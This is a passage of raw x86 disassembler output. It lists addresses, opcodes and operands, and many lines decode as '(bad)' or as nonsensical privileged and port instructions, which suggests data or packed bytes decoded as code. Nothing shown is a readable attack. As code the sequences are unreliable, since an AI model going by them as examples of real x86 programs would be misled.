  4159a9:	loop   0x4159d2
  4159ab:	popa   
  4159ac:	xor    dl,dl
  4159ae:	ins    BYTE PTR es:[edi],dx
  4159af:	push   esp
  4159b0:	xor    BYTE PTR [edi+ecx*8],al
  4159b3:	out    dx,al
  4159b4:	and    DWORD PTR [ecx+eiz*4-0x15],edi
  4159b8:	jle    0x415a15
  4159ba:	mov    esi,0xb70be997
  4159bf:	popa   
  4159c0:	or     BYTE PTR [esi-0x647c9421],cl
  4159c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159c7:	popa   
  4159c8:	(bad)  
  4159c9:	fisttp QWORD PTR [ebx+0x203f059]
  4159cf:	add    al,0x56
  4159d1:	hlt    
  4159d2:	add    bl,al
  4159d4:	loope  0x4159da
  4159d6:	cmp    eax,0x7f03d03c
  4159db:	popa   
  4159dc:	dec    edx
  4159dd:	push   ebx
  4159de:	add    BYTE PTR [ecx+0x6efd43e3],al
  4159e4:	mov    ch,0xde
  4159e6:	call   0x8c467949
  4159eb:	dec    BYTE PTR fs:[esi+edi*8]
  4159ef:	push   esi
  4159f0:	bnd jnp 0x4159fb
  4159f3:	ret    
  4159f4:	jl     0x4159f9
  4159f6:	(bad)  
  4159f7:	jl     0x415a53
  4159f9:	or     eax,0x3efe
	...
  415a26:	pop    ds
  415a27:	(bad)
  415a2b:	inc    ebx
  415a2c:	std    
  415a2d:	cs mov ch,0xde
  415a30:	in     al,0x1e
  415a32:	fild   WORD PTR [ebx+ebp*2]
  415a35:	jmp    0xa8abc09f
  415a3a:	cmp    eax,0x731b404
  415a3f:	add    eax,0x5b7106fe
  415a44:	call   0xfe45d81a
  415a49:	pusha  
  415a4a:	shl    DWORD PTR [ebx],0xf6
  415a4d:	out    dx,al
  415a4e:	(bad)  
  415a50:	cmp    DWORD PTR [ecx+0x39fe0196],0x22
  415a57:	dec    eax
  415a58:	push   0x28
  415a5a:	inc    edx
  415a5b:	add    dh,BYTE PTR [ecx+esi*4-0x3901fe7a]
  415a62:	lock pop edx
  415a64:	call   0xfe43585a
  415a69:	pusha  
  415a6a:	shr    BYTE PTR [esi],0xf6
  415a6d:	scas   al,BYTE PTR es:[edi]
  415a6e:	sahf   
  415a6f:	fnstsw WORD PTR [ebx-0x1fe6967]
  415a75:	jmp    0x54c2d083
  415a7a:	pop    ecx
  415a7b:	or     esi,edi
  415a7d:	mov    ?,WORD PTR ds:0x64006287
  415a83:	loope  0x415a6a
  415a85:	not    DWORD PTR [eax+0x7b]
  415a88:	std    
  415a89:	jae    0x415a8b
	...
  415ab3:	add    BYTE PTR [esi],ch
  415ab5:	out    dx,eax
  415ab6:	std    
  415ab7:	inc    DWORD PTR [eax-0x44]
  415aba:	(bad)  
  415abb:	jne    0x415a74
  415abd:	jbe    0x415b31
  415abf:	cmp    DWORD PTR [eax],edx
  415ac1:	jnp    0x415ac1
  415ac3:	mov    ch,0x7
  415ac5:	mov    ds:0x28f0fffe,eax
  415aca:	push   cs
  415acb:	call   0x3ec038
  415ad0:	push   eax
  415ad1:	jmp    0x7b9252bf
  415ad6:	(bad)  
  415ad7:	jne    0x415b40
  415ad9:	jbe    0x415a93
  415adb:	cmp    DWORD PTR [eax],esp
  415add:	jnp    0x415add
  415adf:	mov    ch,0x4f
  415ae1:	mov    ds:0x2950fffe,eax
  415ae6:	push   cs
  415ae7:	call   0x3ebfe8
  415aec:	inc    eax
  415aed:	jmp    0xa29252cb
  415af2:	(bad)  
  415af3:	mov    ch,0x3b
  415af5:	mov    ds:0x2850fffe,eax
  415afa:	push   cs
  415afb:	call   0x3ebb8c
  415b00:	adc    ah,ah
  415b02:	(bad)  
  415b04:	adc    BYTE PTR [edx+0x762775fe],ah
  415b0a:	mov    BYTE PTR [ecx],bh
  415b0c:	add    BYTE PTR [edx-0x5648427e],ah
  415b12:	(bad)  
  415b13:	call   DWORD PTR [edi]
  415b15:	sub    ah,BYTE PTR [ecx]
  415b17:	push   0x0
	...
  415b40:	add    BYTE PTR [eax],al
  415b42:	push   ss
  415b43:	pop    esi
  415b44:	in     eax,dx
  415b45:	mov    esi,0xe80e23a0
  415b4a:	neg    BYTE PTR [esi-0x3]
  415b4d:	(bad)  
  415b4e:	ds jmp 0xd12b2aeb
  415b54:	pop    ebp
  415b55:	(bad)  
  415b56:	xchg   ebx,eax
  415b57:	fist   WORD PTR [ebp-0x2]
  415b5a:	rol    DWORD PTR [eax-0x3b29f029],1
  415b60:	sbb    al,0xff
  415b62:	shl    DWORD PTR [eax-0x29],0xf
  415b66:	mov    ecx,0xb1f63cde
  415b6b:	mov    al,ds:0x9c36745d
  415b70:	sub    al,0xfe
  415b72:	mov    eax,ds:0x76b45d90
  415b77:	inc    eax
  415b78:	pop    ebp
  415b79:	(bad)  
  415b7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b7b:	add    ebx,DWORD PTR [esi]
  415b7d:	dec    DWORD PTR [ecx-0x761068b8]
  415b83:	xor    BYTE PTR [ebp-0x19],bl
  415b86:	and    edi,eax
  415b88:	pop    esi
  415b89:	(bad)  
  415b8a:	jno    0x415b32
  415b8c:	jo     0x415b84
  415b8e:	imul   ebp,DWORD PTR [eax+0x6c],0x5d512219
  415b95:	(bad)  
  415b96:	xchg   ebx,eax
  415b97:	imul   edx,DWORD PTR [ebp-0x2],0x51
  415b9b:	imul   ecx,DWORD PTR ds:0x5f08493c,0xffffffb4
  415ba2:	pop    edx
  415ba3:	or     BYTE PTR [edi-0x2],bl
	...
  415bce:	add    BYTE PTR [eax],al
  415bd0:	es out dx,eax
  415bd2:	sbb    eax,0x992231ff
  415bd7:	fbstp  TBYTE PTR [ecx]
  415bd9:	sub    bl,BYTE PTR [edi-0x19]
  415bdc:	daa    
  415bdd:	outs   dx,BYTE PTR ds:[esi]
  415bde:	pop    ebp
  415bdf:	(bad)  
  415be0:	sbb    DWORD PTR [eax-0x3dee09cb],eax
  415be6:	imul   ebp,ebp,0xfe5ec945
  415bec:	jnp    0x415bb8
  415bee:	ins    BYTE PTR es:[edi],dx
  415bef:	stc    
  415bf0:	sti    
  415bf1:	pop    ebx
  415bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bf3:	pop    esi
  415bf4:	lock xchg BYTE PTR [ebx-0x18ccc895],bl
  415bfb:	add    esi,edi
  415bfd:	sbb    eax,0xd47303dc
  415c02:	xchg   ebx,eax
  415c03:	cmp    ch,0xff
  415c06:	adc    DWORD PTR [esp+edx*2],eax
  415c09:	mov    ?,WORD PTR [esi-0x28]
  415c0c:	cmp    ebx,esi
  415c0e:	out    0x1c,eax
  415c10:	mov    ecx,0xb5c87100
  415c15:	add    ch,dl
  415c17:	or     edx,DWORD PTR [esi]
  415c19:	mov    eax,0x1a1c4c0
  415c1e:	adc    eax,0xe79a0139
  415c23:	imul   esi,DWORD PTR [eax-0x77a1c102],0xffffff86
  415c2a:	fucomip st,st(3)
  415c2c:	fdiv   DWORD PTR [edx-0x58]
  415c2f:	add    esp,esi
  415c31:	pop    esp
  415c32:	out    0x3,eax
	...
  415c5c:	add    BYTE PTR [eax],al
  415c5e:	mov    esi,0x68606cf3
  415c63:	add    BYTE PTR [edi],dl
  415c65:	fsub   DWORD PTR [ebp+0x0]
  415c68:	xchg   ebp,eax
  415c69:	or     esp,DWORD PTR [esi+0x6c]
  415c6c:	rcr    BYTE PTR [esi+0x50],0x12
  415c70:	sub    al,BYTE PTR [edi]
  415c72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c74:	bound  ebp,QWORD PTR [edi-0x44]
  415c77:	pop    ss
  415c78:	in     al,dx
  415c79:	mov    ah,0x90
  415c7b:	jne    0x415c64
  415c7d:	jmp    0xc965d05
  415c82:	push   ss
  415c83:	(bad)  
  415c84:	minps  xmm4,XMMWORD PTR [eax]
  415c87:	shl    BYTE PTR [eax+eiz*2],cl
  415c8a:	les    eax,FWORD PTR [ebp+0x20]
  415c8d:	int3   
  415c8e:	jle    0x415ceb
  415c90:	jb     0x415cb1
  415c92:	imul   edx,DWORD PTR [ebx-0x24c5d800],0x3d
  415c99:	jmp    0x2ba9f3af
  415c9e:	in     al,0x9a
  415ca0:	add    BYTE PTR [esi],dh
  415ca2:	pop    edx
  415ca3:	sub    ah,BYTE PTR [esi]
  415ca5:	jmp    0x1601b0e7
  415caa:	(bad)  [ebp+0xf8cfe8]
  415cb0:	(bad)  
  415cb1:	sbb    edx,ebx
  415cb3:	(bad)  
  415cb4:	std    
  415cb5:	xchg   BYTE PTR [eax+0x7d034977],ah
  415cbb:	dec    DWORD PTR [ebp+0x66]
  415cbe:	mov    DWORD PTR [edi-0x18],edx
  415cc1:	sbb    eax,DWORD PTR [eax]
	...
  415ceb:	add    BYTE PTR [esi+0x4741fe00],dl
  415cf1:	inc    esp
  415cf2:	std    
  415cf3:	dec    esi
  415cf4:	daa    
  415cf5:	pop    ebx
  415cf6:	inc    esi
  415cf7:	imul   esi,DWORD PTR [eax],0x8043735b
  415cfd:	add    esi,DWORD PTR [edx]
  415cff:	sub    DWORD PTR [ebp+0x1b2efe00],esp
  415d05:	or     ch,BYTE PTR [edi-0x4679c51f]
  415d0b:	push   ds
  415d0c:	xchg   ecx,eax
  415d0d:	add    edi,esi
  415d0f:	pushf  
  415d10:	xor    eax,0xfad195f3
  415d15:	add    BYTE PTR [esi-0x59],bl
  415d18:	add    al,0x1a
  415d1a:	add    eax,0xecd490e9
  415d1f:	push   0xfffffff6
  415d21:	add    ebp,DWORD PTR [ebx-0x17]
  415d24:	daa    
  415d25:	mov    ?,ebp
  415d27:	pop    esp
  415d28:	inc    edx
  415d29:	repz aaa 
  415d2b:	and    DWORD PTR [ebx-0x61d37803],ecx
  415d31:	je     0x415d33
  415d33:	inc    ecx
  415d34:	cli    
  415d35:	je     0x415d76
  415d37:	add    BYTE PTR [edi],ah
  415d39:	repz push ebp
  415d3b:	push   0x56
  415d3d:	push   edi
  415d3e:	std    
  415d3f:	xor    eax,0x4112a2
  415d44:	call   FWORD PTR [edi+0x5398ff3c]
  415d4a:	shl    BYTE PTR [esi+edi*1-0x39],0x65
	...
  415d77:	add    BYTE PTR [eax],al
  415d79:	add    bh,dl
  415d7b:	outs   dx,DWORD PTR ds:[esi]
  415d7c:	mov    ebx,0x40f45e68
  415d81:	add    BYTE PTR [edi],dh
  415d83:	mov    al,ds:0x99af0874
  415d88:	(bad)  
  415d89:	dec    DWORD PTR [eax+0x72]
  415d8c:	(bad)  
  415d8d:	cmp    ch,BYTE PTR [eax]
  415d8f:	lahf   
  415d90:	add    BYTE PTR gs:[edi+0x2e68bb6f],ah
  415d97:	hlt    
  415d98:	inc    eax
  415d99:	add    BYTE PTR [edi-0x26],bh
  415d9c:	addr16 inc ecx
  415d9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d9f:	lahf   
  415da0:	je     0x415daa
  415da2:	out    dx,eax
  415da3:	test   eax,0x9f48ff62
  415da8:	je     0x415da6
  415daa:	dec    eax
  415dab:	and    eax,0x5f41e806
  415db0:	std    
  415db1:	jmp    FWORD PTR [esi]
  415db3:	pushf  
  415db4:	add    DWORD PTR [eax],eax
  415db6:	mov    dl,0xd3
  415db8:	jmp    0x53df7140
  415dbd:	push   edi
  415dbe:	mov    ebp,0x38506a5a
  415dc3:	and    eax,0x670fe806
  415dc8:	std    
  415dc9:	(bad)  
  415dca:	ficom  WORD PTR [edx+edi*8]
  415dcd:	mov    esi,edx
  415dcf:	rol    BYTE PTR [ebp+0x41],0x27
  415dd3:	int    0x3c
  415dd5:	pop    ebp
  415dd6:	outs   dx,DWORD PTR ds:[esi]
  415dd7:	sbb    dh,bh
  415dd9:	jg     0x415e19
  415ddb:	gs add al,0x74
	...
  415e06:	add    BYTE PTR [eax],al
  415e08:	sbb    DWORD PTR [esp+edi*2-0x4d0b8097],0xffffffe7
  415e10:	and    edx,DWORD PTR [esi+0x4]
  415e13:	add    BYTE PTR ds:0x901ed0b4,dh
  415e19:	sbb    al,0x1c
  415e1b:	inc    esp
  415e1c:	icebp  
  415e1d:	mov    ah,0xb4
  415e1f:	addr16 ds hlt 
  415e22:	push   0xffffffbd
  415e24:	push   esi
  415e25:	xchg   edx,eax
  415e26:	out    dx,al
  415e27:	inc    eax
  415e28:	ds inc esp
  415e2a:	pop    ecx
  415e2b:	je     0x415e73
  415e2d:	in     al,dx
  415e2e:	mov    edi,0x6c7cc962
  415e33:	dec    ebp
  415e34:	add    al,0x85
  415e36:	pop    ecx
  415e37:	jmp    0x1f3e:0x3d84363f
  415e3e:	pop    esp
  415e3f:	inc    ebp
  415e40:	stos   BYTE PTR es:[edi],al
  415e41:	pusha  
  415e42:	inc    esp
  415e43:	mov    eax,0xfe59a4a1
  415e48:	mov    WORD PTR [ebp+0x1c],?
  415e4b:	pop    es
  415e4c:	or     ebx,ecx
  415e4e:	pop    ecx
  415e4f:	je     0x415ddb
  415e51:	cmp    al,0xcf
  415e53:	pop    es
  415e54:	xchg   esi,eax
  415e55:	fst    DWORD PTR [ecx]
  415e57:	(bad)  
  415e58:	jns    0x415e26
  415e5a:	mov    bh,0xc8
  415e5c:	jl     0x415e4d
  415e5e:	add    DWORD PTR [ebp-0x4b],edx
  415e61:	dec    edi
  415e62:	test   ebx,eax
  415e64:	bound  edi,QWORD PTR [ebp-0x25c1964e]
  415e6a:	mov    ah,0xfe
	...
  415e94:	add    BYTE PTR [eax],al
  415e96:	retf   
  415e97:	or     ebp,DWORD PTR [edx+0x49]
  415e9a:	adc    ebp,edi
  415e9c:	pop    edx
  415e9d:	mov    bl,bh
  415e9f:	pop    es
  415ea0:	(bad)  
  415ea1:	xor    al,0x97
  415ea3:	mov    edx,0x5bc4ffc4
  415ea8:	and    al,0xb9
  415eaa:	sbb    DWORD PTR [edx+0x5b6083e7],0xada1c15b
  415eb4:	inc    ecx
  415eb5:	lds    edx,FWORD PTR [ecx]
  415eb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eb8:	iret   
  415eb9:	loop   0x415f1e
  415ebb:	pop    ebx
  415ebc:	out    0xe,eax
  415ebe:	inc    BYTE PTR [edi-0x3f1e4e2a]
  415ec4:	sub    bl,BYTE PTR [ebx-0x10]
  415ec7:	stos   DWORD PTR es:[edi],eax
  415ec8:	(bad)  
  415eca:	ds in  al,dx
  415ecc:	pop    ebp
  415ecd:	jmp    0x415e70
  415ecf:	jno    0x415ef9
  415ed1:	add    al,0x6e
  415ed3:	cld    
  415ed4:	adc    al,0xc
  415ed6:	out    0x14,al
  415ed8:	or     bl,BYTE PTR [ebx-0x38]
  415edb:	repz xchg edi,eax
  415edd:	sbb    al,0xc1
  415edf:	cld    
  415ee0:	add    BYTE PTR [eax+eax*1],0xdb
  415ee4:	lods   eax,DWORD PTR ds:[esi]
  415ee5:	add    ebp,DWORD PTR [ebx]
  415ee7:	add    DWORD PTR [esi-0x5ee493a9],ebp
  415eed:	pop    edx
  415eee:	mov    al,ds:0xeb5556fc
  415ef3:	inc    ebx
  415ef4:	out    0xd0,al
  415ef6:	aam    0xfc
  415ef8:	mov    esp,0x57
	...
  415f21:	add    BYTE PTR [eax],al
  415f23:	add    BYTE PTR [eax+0x556bef86],cl
  415f29:	inc    esp
  415f2a:	ss pop edx
  415f2c:	sbb    BYTE PTR [ebp+0x5b3d4520],bl
  415f32:	mov    esp,0x23d8558e
  415f37:	push   edi
  415f38:	xlat   BYTE PTR ds:[ebx]
  415f39:	pop    edx
  415f3a:	xor    DWORD PTR [ebp+0x6bdf8658],0x5a064583
  415f44:	mov    dh,0x96
  415f46:	sti    
  415f47:	jmp    0xfc3d:0xa8007174
  415f4e:	jae    0x415f31
  415f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f51:	mov    fs,eax
  415f53:	out    0x87,al
  415f55:	std    
  415f56:	jae    0x415f35
  415f58:	xchg   DWORD PTR [edi+0x4675c108],eax
  415f5e:	std    
  415f5f:	into   
  415f60:	test   DWORD PTR [edx],ebx
  415f62:	add    eax,0xecd0d8e9
  415f67:	push   0x7e
  415f69:	sbb    al,0x57
  415f6b:	mov    dh,0x9
  415f6d:	push   eax
  415f6e:	call   0xfe3db397
  415f73:	bnd jge 0x415efd
  415f76:	add    edi,DWORD PTR [edi]
  415f78:	jne    0x415f94
  415f7a:	or     ecx,ebp
  415f7c:	rcl    BYTE PTR [esi-0x7888c610],0xc
  415f83:	xchg   ecx,eax
  415f84:	outs   dx,DWORD PTR ds:[esi]
  415f85:	ds std 
  415f87:	jle    0x415f89
	...
  415fb1:	add    BYTE PTR [ebx],dh
  415fb3:	sbb    ecx,DWORD PTR [esi]
  415fb5:	ins    DWORD PTR es:[edi],dx
  415fb6:	dec    edx
  415fb7:	pop    edx
  415fb8:	add    cl,ch
  415fba:	push   ss
  415fbb:	xchg   esp,edi
  415fbd:	push   ecx
  415fbe:	call   0xb5a05d05
  415fc3:	xchg   esi,eax
  415fc4:	in     al,dx
  415fc5:	push   esi
  415fc6:	mov    edi,edi
  415fc8:	std    
  415fc9:	aam    0x19
  415fcb:	std    
  415fcc:	jae    0x41600f
  415fce:	sbb    bh,BYTE PTR [edi+esi*1+0x3e]
  415fd2:	out    0xd0,eax
  415fd4:	jae    0x41601b
  415fd6:	in     eax,0xab
  415fd8:	add    cl,ch
  415fda:	cmp    eax,0x7c925a73
  415fdf:	sti    
  415fe0:	push   ebx
  415fe1:	adc    ecx,eax
  415fe3:	ss add cl,ch
  415fe6:	dec    edx
  415fe7:	sbb    esi,DWORD PTR [esp+eiz*8-0x1c]
  415feb:	mov    dh,0x0
  415fed:	add    BYTE PTR [edi+0x57],dl
  415ff0:	mov    eax,esi
  415ff2:	scas   eax,DWORD PTR es:[edi]
  415ff3:	mov    ebp,0x8727416a
  415ff8:	frstor [ebx]
  415ffa:	daa    
  415ffb:	pop    edi
  415ffc:	add    eax,esi
  415ffe:	scas   al,BYTE PTR es:[edi]
  415fff:	sub    esi,esp
  416001:	push   0x410875
  416006:	pop    ecx
  416007:	xchg   DWORD PTR [ebp+0x25],edi
  41600a:	daa    
  41600b:	pop    edi
  41600c:	or     eax,eax
  41600e:	dec    edx
  41600f:	cli    
  416010:	call   0xa07795
  416015:	mov    al,BYTE PTR [eax]
	...
  41603f:	add    BYTE PTR [edi],dl
  416041:	popf   
  416042:	std    
  416043:	call   DWORD PTR [edi-0x4f]
  416046:	(bad)  
  416047:	jne    0x416018
  416049:	xchg   BYTE PTR [ebp+0x95ed723],dh
  41604f:	sar    BYTE PTR [ebx],0xff
  416052:	mov    BYTE PTR [ebp-0x45],al
  416055:	xchg   ebx,eax
  416056:	je     0x416040
  416058:	scas   eax,DWORD PTR es:[edi]
  416059:	imul   eax,DWORD PTR [ebp-0x1],0x40
  41605d:	in     eax,0x44
  41605f:	loopne 0x416091
  416061:	sub    edx,esp
  416063:	jmp    FWORD PTR [edx-0x11861a82]
  416069:	xchg   ebx,eax
  41606a:	dec    BYTE PTR [ebx]
  41606c:	push   edi
  41606d:	sub    bh,BYTE PTR [ebx]
  41606f:	rol    DWORD PTR [edx-0xdff9866],1
  416075:	mov    eax,0x290050e1
  41607a:	fsubp  st(0),st
  41607c:	xor    al,BYTE PTR [ecx]
  41607e:	(bad)  
  41607f:	call   FWORD PTR [esi+ebx*4+0x71]
  416083:	es jg  0x4160e3
  416086:	add    bh,ch
  416088:	loope  0x41601c
  41608a:	je     0x416094
  41608c:	dec    edi
  41608d:	scas   al,BYTE PTR es:[edi]
  41608e:	xor    al,0xff
  416090:	ds push ecx
  416092:	pop    eax
  416093:	je     0x4160fb
  416095:	imul   ecx,esi,0xea95607
  41609b:	inc    DWORD PTR [ecx-0x7]
  41609e:	retf   
  41609f:	jecxz  0x4160da
  4160a1:	ja     0x416104
  4160a3:	inc    BYTE PTR [eax]
	...
  4160cd:	add    BYTE PTR [ebx+0x736c69fc],ch
  4160d3:	add    DWORD PTR [esi-0x2],edx
  4160d6:	stos   DWORD PTR es:[edi],eax
  4160d7:	and    al,0x6d
  4160d9:	jge    0x416131
  4160db:	adc    DWORD PTR [esi+0x59],edx
  4160de:	jbe    0x41615c
  4160e0:	hlt    
  4160e1:	jg     0x41612b
  4160e3:	add    al,0x7
  4160e5:	test   DWORD PTR [ecx-0x47],edi
  4160e8:	push   ebp
  4160e9:	(bad)  
  4160ea:	pushw  es
  4160ec:	add    ch,bh
  4160ee:	mov    al,0xc8
  4160f0:	iret   
  4160f1:	pop    es
  4160f2:	(bad)  
  4160f3:	not    BYTE PTR [eax]
  4160f5:	jmp    ecx
  4160f7:	fmul   st,st(7)
  4160f9:	sti    
  4160fa:	fst    DWORD PTR [esi+0x68]
  4160fd:	dec    BYTE PTR [ebx-0x4]
  416100:	imul   edi,DWORD PTR [ebx+edx*1],0x4bfe55e1
  416107:	call   0x71b7ae78
  41610c:	push   ebp
  41610d:	mov    ebx,?
  41610f:	jae    0x4160c5
  416111:	out    0x2b,eax
  416113:	inc    edx
  416114:	push   ebp
  416115:	(bad)  
  416116:	xchg   ebp,eax
  416117:	add    esi,DWORD PTR [eax+ecx*8+0x5501fb7c]
  41611e:	lds    esi,FWORD PTR [edi]
  416120:	add    ebx,0xfbbf6ea2
  416126:	out    dx,al
  416127:	cmp    bh,cl
  416129:	or     edi,DWORD PTR [ecx-0x4a]
  41612c:	or     eax,ebp
  41612e:	adc    eax,0x460
	...
  41615b:	add    BYTE PTR ds:0xbb07275b,dh
  416161:	inc    edx
  416162:	call   0xe7c69f6a
  416167:	jmp    0x416174
  416169:	xchg   BYTE PTR [eax-0xc90b6fd],ch
  41616f:	push   esi
  416170:	retf   0xf62
  416173:	pop    ds
  416174:	jne    0x41616e
  416176:	test   BYTE PTR [edx+edi*2-0x69fc7e0d],0x34
  41617e:	push   edx
  41617f:	lds    esp,FWORD PTR [ecx]
  416181:	cli    
  416182:	push   esp
  416183:	or     BYTE PTR [ecx],bl
  416185:	outs   dx,DWORD PTR ds:[esi]
  416186:	fild   QWORD PTR [ebx+0x2f]
  416189:	xor    al,0xce
  41618b:	push   esi
  41618c:	mov    dh,0x9e
  41618e:	mov    ebx,0x17ff7a88
  416193:	in     al,dx
  416194:	jg     0x41611a
  416196:	sub    BYTE PTR [ecx+esi*8],al
  416199:	outs   dx,BYTE PTR ds:[esi]
  41619a:	fist   DWORD PTR [esi+0x72]
  41619d:	arpl   WORD PTR [edi-0x6107d8a6],cx
  4161a3:	mov    WORD PTR [edx+0x660401eb],es
  4161a9:	mov    ds:0xf9c9c502,al
  4161ae:	cld    
  4161af:	pop    es
  4161b0:	shr    DWORD PTR [esi-0x11],0x6b
  4161b4:	mov    ds:0xc6567635,eax
  4161b9:	sahf   
  4161ba:	jnp    0x4161a5
  4161bc:	test   eax,0xeab580
	...
  4161e9:	add    dh,bh
  4161eb:	pop    edx
  4161ec:	pop    esi
  4161ed:	rol    BYTE PTR [ebp-0x8],1
  4161f0:	fmul   QWORD PTR [ebx]
  4161f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161f3:	or     dl,BYTE PTR [edx]
  4161f5:	push   edi
  4161f6:	mov    dl,ah
  4161f8:	lods   al,BYTE PTR ds:[esi]
  4161f9:	imul   edi,DWORD PTR [esi+esi*2-0x20b6fcc9],0x0
  416201:	push   0x3d
  416203:	pop    ebx
  416204:	add    BYTE PTR [edx-0x7a],ch
  416207:	cld    
  416208:	add    BYTE PTR [ebp+0x573f986],bl
  41620e:	lock outs dx,BYTE PTR ds:[esi]
  416210:	lock add DWORD PTR [eax-0x60],edi
  416214:	std    
  416215:	push   cs
  416216:	xor    al,0x1b
  416218:	jne    0x4161b1
  41621a:	or     al,BYTE PTR [edi-0x19c26c1c]
  416220:	inc    ebx
  416221:	or     eax,0xf973f8ed
  416226:	xchg   esp,eax
  416227:	pop    ebp
  416228:	pop    edi
  416229:	out    0x8b,al
  41622b:	rcl    BYTE PTR gs:[ebp-0x2b],0xdc
  416230:	jnp    0x416203
  416232:	cmp    ch,BYTE PTR [edi+0x51]
  416235:	push   0xfffffff1
  416237:	jmp    0x416239
  416239:	cmp    eax,0xb97bdcf9
  41623e:	inc    edx
  41623f:	outs   dx,DWORD PTR ds:[esi]
  416240:	inc    ebp
  416241:	inc    ecx
  416242:	cmp    bl,BYTE PTR [ebx-0x13]
  416245:	outs   dx,DWORD PTR ds:[esi]
  416246:	xchg   ebx,eax
  416247:	outs   dx,DWORD PTR ds:[esi]
  416248:	adc    BYTE PTR [ecx-0x6102d412],dl
	...
  416276:	add    BYTE PTR [eax],al
  416278:	jae    0x4162e9
  41627a:	clc    
  41627b:	xchg   esi,eax
  41627c:	add    DWORD PTR [eax-0x18],ebp
  41627f:	add    ch,BYTE PTR [esi]
  416281:	clc    
  416282:	std    
  416283:	xchg   cl,dh
  416285:	jmp    0x416284
  416287:	hlt    
  416288:	lods   eax,DWORD PTR ds:[esi]
  416289:	jmp    DWORD PTR [eax-0x43]
  41628c:	or     bh,cl
  41628e:	std    
  41628f:	hlt    
  416290:	or     ecx,edi
  416292:	jae    0x4162ed
  416294:	or     ebp,DWORD PTR [edi+0x10]
  416297:	push   ecx
  416298:	cmp    BYTE PTR [edi],ch
  41629a:	std    
  41629b:	push   esi
  41629c:	jmp    0x41630c
  41629e:	in     al,dx
  41629f:	dec    esi
  4162a0:	jns    0x416309
  4162a2:	call   0xfda932a7
  4162a7:	(bad)  
  4162a8:	cmp    BYTE PTR [eax],ch
  4162aa:	out    0xff,al
  4162ac:	mov    dl,0xeb
  4162ae:	in     eax,0x3c
  4162b0:	jae    0x416240
  4162b2:	(bad)  
  4162b3:	inc    edx
  4162b5:	xchg   ebx,eax
  4162b6:	in     eax,0x21
  4162b8:	jo     0x416248
  4162ba:	(bad)  
  4162bb:	push   DWORD PTR [edx+0x7019e5a7]
  4162c1:	mov    ?,esi
  4162c3:	inc    edx
  4162c5:	mov    esp,ebp
  4162c7:	adc    eax,esi
  4162c9:	(bad)  
  4162ca:	(bad)  
  4162cb:	push   DWORD PTR [edx-0xff61a82]
  4162d1:	(bad)  
  4162d2:	(bad)  
  4162d3:	inc    DWORD PTR [edx+0x3001e587]
  4162d9:	nop
  4162da:	(bad)  
  4162db:	inc    DWORD PTR [eax]
	...
  416305:	add    BYTE PTR [edx-0x6d],dh
  416308:	in     eax,0x25
  41630a:	xor    al,0x5f
  41630c:	add    cl,cl
  41630e:	aad    0x5e
  416310:	add    BYTE PTR [ebp+0x6c],dl
  416313:	jle    0x416295
  416315:	(bad)  
  416316:	jmp    DWORD PTR [edi-0x4a750002]
  41631c:	stc    
  41631d:	push   eax
  41631e:	cwde   
  41631f:	and    eax,0x6732ff0a
  416324:	call   0x9c6738
  416329:	or     edx,DWORD PTR [edi-0x285a7ca1]
  41632f:	pop    edx
  416330:	add    bh,al
  416332:	bound  edx,QWORD PTR [edi+0x5aa7fffd]
  416338:	lds    eax,FWORD PTR [ebp+0x33]
  41633b:	pop    DWORD PTR [esi]
  41633d:	add    BYTE PTR [edi-0x589601fc],dl
  416343:	fld    QWORD PTR [esp+ebp*8-0x1ab6ac2]
  41634a:	out    dx,al
  41634b:	sbb    DWORD PTR [edx],eax
  41634d:	(bad)  
  41634e:	sti    
  41634f:	aaa    
  416350:	mov    cl,0x8c
  416352:	ret    
  416353:	xor    BYTE PTR [esi+edi*8+0x71],cl
  416357:	aam    0x54
  416359:	je     0x4163c1
  41635b:	inc    ebp
  41635c:	into   
  41635d:	sti    
  41635e:	push   esi
  41635f:	cmp    bl,BYTE PTR [edi]
  416361:	add    BYTE PTR [esi],bh
  416363:	jmp    0x597dd6a9
  416368:	fild   DWORD PTR [edx+0x0]
	...
  416392:	add    BYTE PTR [eax],al
  416394:	mov    edi,eax
  416396:	dec    ecx
  416397:	inc    BYTE PTR [ecx+0x3]
  41639a:	into   
  41639b:	add    al,0x39
  41639d:	mov    edi,0x7efcea59
  4163a2:	jle    0x41638b
  4163a4:	xor    DWORD PTR ds:0x86b34f52,eax
  4163aa:	pop    eax
  4163ab:	neg    BYTE PTR [ecx]
  4163ad:	adc    eax,0x8bfeb5
  4163b2:	push   ebx
  4163b3:	je     0x4163eb
  4163b5:	sbb    al,0x82
  4163b7:	cmp    BYTE PTR [ecx],al
  4163b9:	sbb    eax,0xf172bffe
  4163be:	jl     0x416344
  4163c0:	out    dx,al
  4163c1:	mov    ah,0x51
  4163c3:	(bad)  
  4163c4:	push   esi
  4163c5:	dec    edi
  4163c6:	fld    QWORD PTR [eax+0x3e]
  4163c9:	mov    ebp,0xd4d1ef97
  4163ce:	push   ecx
  4163cf:	out    0xef,eax
  4163d1:	and    DWORD PTR [edx],eax
  4163d3:	add    BYTE PTR ds:0xc10dd8c4,dh
  4163d9:	ss push esp
  4163db:	idiv   BYTE PTR [ecx+0x4e745174]
  4163e1:	fdivr  QWORD PTR [eax]
  4163e3:	sti    
  4163e4:	test   eax,0xaeb45184
  4163e9:	pop    edx
  4163ea:	pop    esi
  4163eb:	push   ebx
  4163ec:	cwde   
  4163ed:	add    ch,BYTE PTR [eax+0x56f59119]
  4163f3:	leave  
  4163f4:	xchg   ecx,eax
  4163f5:	add    eax,edx
  4163f7:	push   edx
	...
  416420:	add    BYTE PTR [eax],al
  416422:	xor    ch,0x46
  416425:	fnstenv [ebp+0x2]
  416428:	pushf  
  416429:	and    eax,0x46205b3e
  41642e:	xor    eax,0x557e945b
  416433:	fldcw  WORD PTR [ebx]
  416435:	push   eax
  416436:	out    0x5a,eax
  416438:	xchg   ecx,eax
  416439:	mov    dh,0x50
  41643b:	outs   dx,DWORD PTR ds:[esi]
  41643c:	fistp  WORD PTR [ebx-0x11]
  41643f:	sub    DWORD PTR [esi],ecx
  416441:	push   ebx
